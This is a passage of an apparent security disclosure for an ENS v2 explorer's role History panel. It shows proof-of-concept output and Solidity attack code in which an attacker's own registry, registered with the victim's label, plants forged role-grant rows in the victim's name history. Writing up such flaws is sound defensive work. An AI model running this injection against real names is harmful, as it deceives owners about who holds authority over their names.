      isn't scoped by registry — `ROOT_RESOURCE` (`0x0`) is shared across every
      sub-registry, so a resource-only filter would conflate role grants across
      unrelated registries. The `events(contractAddress:)` filter is registry-
      scoped, so we use that and reconstruct state client-side.

==============================================================================
  ACT 2  That query, run against the indexer the app reads
==============================================================================
    rows the app pulls in one panel load 50000
    distinct registry contracts in them 3103
    block range                        11586914 .. 11690433

  Every one of those rows is a candidate row for every name that shares
  a label with the entry the grant was written against.

==============================================================================
  ACT 3  The victim: deltab-rolehist-victim.eth, an ordinary 2LD in the canonical v2 ETHRegistry
==============================================================================
    label                              deltab-rolehist-victim
    resource the panel filters by      0xfa7a6cccf2bbafa3ae882c64c818acf8aba893ee827be4e7ef8e207e00000000
    owner                              0x6561a2ecc270317526f3ca1b8b6b9a456b7ddb74
    manager the owner granted a role to 0x3c7004bf2a97410f4fff893795281abe4b8a0e1d

    rows after filterEventsByResource  4
    rows after the account filter      2

  What the History panel renders, newest first:
    block 11640052  0x7f51946d...010220  + ROLE_SET_RESOLVER, + ROLE_SET_SUBREGISTRY
      emitted by 0x39a25605c022d0d0d4f429dc0ad987119bb2b21d   NOT the victim's registry
    block 11640037  0x22c47e04...ca48be  + ROLE_SET_RESOLVER
      emitted by 0xbdc85dd5b15d7ecb354cd7cb6f2c50b4f2c4f0e2   the victim's own registry

==============================================================================
  ACT 4  Who wrote the top row
==============================================================================
    the genuine row, block             11640037
      emitter                          0xbdc85dd5b15d7ecb354cd7cb6f2c50b4f2c4f0e2  canonical v2 ETHRegistry
      tx                               0x22c47e04d4f2b90f9dc58b5068a34f660e256d6eaf4afed854eb065e2bca48be

    the top row, block                 11640052
      emitter                          0x39a25605c022d0d0d4f429dc0ad987119bb2b21d  the attacker's registry
      tx                               0x7f51946d784f607b727962be408757dcb2f59973cb1a14f25cc54e91e7010220

  Every transaction the attacker sent, from the fresh EOA 0x6a0554a9e2c3656da2ca27c91c97b20f58f6defa:
    mint the testnet USDC the .eth fee is paid in 0x63646694...801c03   51368 gas
    deployProxy on the real VerifiableFactory    0x5b333313...0db1e8  176513 gas
    commit a .eth registration                   0x11b90c20...2618f4   45433 gas
    approve the registration fee                 0xf5f36665...5b25b7   46353 gas
    register it, subregistry = that registry     0x438f2bac...723020  240694 gas
    register the victim's label in that registry 0x165f0340...b02ef5  145864 gas
    grantRoles to the victim's manager           0x7f51946d...010220  124561 gas
    total                                                             830786 gas
    plus one .eth registration, 8.000021 USDC for a year.

  The resource is not a coincidence and not a collision the attacker
  searched for. Both registries derive it from the labelhash alone:
    ETHRegistry.getResource(labelhash) 0xfa7a6cccf2bbafa3ae882c64c818acf8aba893ee827be4e7ef8e207e00000000
    attacker registry, same call       0xfa7a6cccf2bbafa3ae882c64c818acf8aba893ee827be4e7ef8e207e00000000

  The attacker holds no role on the victim's name, owns no part of it,
  and never sent a transaction to the victim's registry.

==============================================================================
  ACT 5  CONTROL: the registry-scoped query the same screen uses for authority
==============================================================================
    useNameRoleAccounts.ts, contractAddress-scoped 0 row
    useRoleHistory.ts, unscoped        2 rows

  The same screen answers "what happened" with the unscoped query and gets
  the attacker's row (asserted above, ACT 3). This control is informational,
  not load-bearing: useNameRoleAccounts.ts (:50 MAX_EVENTS=1000, no pagination)
  ages out the genuine grant on its own, independent of this attack, once the
  shared ETHRegistry accrues 1000 newer EACRolesChanged rows from OTHER names.
  OBSERVED DRIFT: scoped query returned 0 row(s), not the 1 seen at
  attack time (2026-09-05), because that hook has its own separate 1000-event cap on
  the shared registry. Not a failure of this claim: ACT 3/4 above re-ran the actual
  injection fresh today and it is unchanged.

    resources in the window            43643
    drawing rows from exactly one registry 43607
    drawing rows from more than one    36
  A second registry on a panel is an anomaly, not the ambient state of
  the data. It is what the attack produces.

==============================================================================
  ACT 6  The same defect, already live on names this report never touched
==============================================================================
    (resource, account) pairs spanning >1 registry 20
  Each one is a name whose History panel today shows rows written in a
  registry it has no relationship with. None of them were attacked by
  this report; ordinary subregistry use produced them.

------------------------------------------------------------------------------
  deltab-rolehist-victim.eth History panel, rows shown for 0x3c7004bf2a97410f4fff893795281abe4b8a0e1d
------------------------------------------------------------------------------
    rows written by            registry              before   after   delta
    the victim's own registry  0xbdc85dd5...c4f0e2       1       1       0
    an attacker                0x39a25605...b2b21d       0       1       1

  1 of the 2 authorization events the app presents as deltab-rolehist-victim.eth's
  own history was written by an attacker who holds no role on the name.
  It is the newest row, so it renders at the top of the panel.
------------------------------------------------------------------------------

==============================================================================
  PoC PASSED, every assertion held.
==============================================================================
```

The attacker's row is 1 of the 2 authorization events the app presents as this name's own history, and it is the newest, so it renders at the top of the panel. Exit code is 0 only if every assertion held.

## Attack code

```solidity
// 1. The attacker owns one ENS name, the ordinary state of an ENS user.
//    Deploy a registry through the real VerifiableFactory.
VerifiableFactory.deployProxy(
    ensUserRegistryImpl,
    salt,
    abi.encodeCall(PermissionedRegistry.initialize, (attacker, ROLES_ALL))
);

// 2. Point a name the attacker registered at it. This is the step that puts
//    the registry into the index the Explorer reads.
ETHRegistrar.register(
    "deltab-rolehist-attacker", attacker, secret,
    attackerRegistry,              // the registry from step 1
    address(0), 365 days, usdc, bytes32(0)
);
```

```solidity
// 3. Register the VICTIM's label inside it. getResource on the attacker's
//    registry now returns the exact value the victim's panel filters by.
attackerRegistry.register(
    "deltab-rolehist-victim", attacker, address(0), address(0), ROLES_ALL, expiry
);

// 4. Grant any role to an address that already holds a role on the victim's
//    name. That address is public and the app prints it one table above.
attackerRegistry.grantRoles(
    0xfa7a6cccf2bbafa3ae882c64c818acf8aba893ee827be4e7ef8e207e00000000,
    (1 << 24) | (1 << 20),                        // ROLE_SET_RESOLVER | ROLE_SET_SUBREGISTRY
    0x3c7004bf2a97410F4FFF893795281abE4B8A0E1d    // the victim's manager
);
```

```
// 5. The owner opens /deltab-rolehist-victim.eth/roles and clicks that manager.
//    RoleHistoryTable asks useRoleHistory for label "deltab-rolehist-victim",
//    gets every EACRolesChanged on the chain, keeps the ones whose resource
//    matches, keeps the ones whose account matches, and renders the attacker's
//    grant at the top of the History panel, dated, hashed, and labelled
//    "Name: deltab-rolehist-victim.eth" in the detail sheet.
```

```
plant : register the victim's label in a registry the attacker deployed
fire  : attackerRegistry.grantRoles(labelToCanonicalId(label), anyRole, a role holder on the victim's name)
```
